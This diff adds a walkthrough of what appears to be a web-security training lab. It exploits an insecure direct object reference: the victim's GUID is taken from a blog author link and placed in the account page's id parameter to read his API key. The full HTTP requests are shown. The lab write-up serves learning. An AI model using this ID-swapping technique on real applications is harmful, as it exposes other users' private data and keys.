@@ -1,1 +1,71 @@
+Lab Description:
+
+This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.
+To solve the lab, find the GUID for carlos, then submit his API key as the solution.
+You can log in to your own account using the following credentials: wiener:peter
+
+As described, the ID now is unpredictable, so i need to find the id for user carlos in another page of the application, the following request shows the GET request for the account page of
+the user wiener:
+
+GET /my-account?id=7c79aabb-08e2-4616-b17b-70adce1c47bc HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSION_ID
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Referer: https://LAB_ID.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+
+Analyzing the application, i found on the home page various blog posts, some of these were written by the user carlos, on Burp, its possible to see the request:
+
+GET /blogs?userId=2e34dcfc-5c5d-44bf-a3af-04129a6a6bfb HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSION_ID
+Sec-Ch-Ua: "Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://LAB_ID.web-security-academy.net/post?postId=3
+Accept-Encoding: gzip, deflate, br
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+
+The user id is disclosed on this page, so i just copy this value, send the GET request for the account page to Repeater and place the value on the id parameter, as follows:
+
+GET /my-account?id=2e34dcfc-5c5d-44bf-a3af-04129a6a6bfb HTTP/2
+Host: LAB_ID.web-security-academy.net
+Cookie: session=SESSION_ID
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Referer: https://LAB_ID.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+
+And it works, the response brings the account page for user carlos and his API key.
 
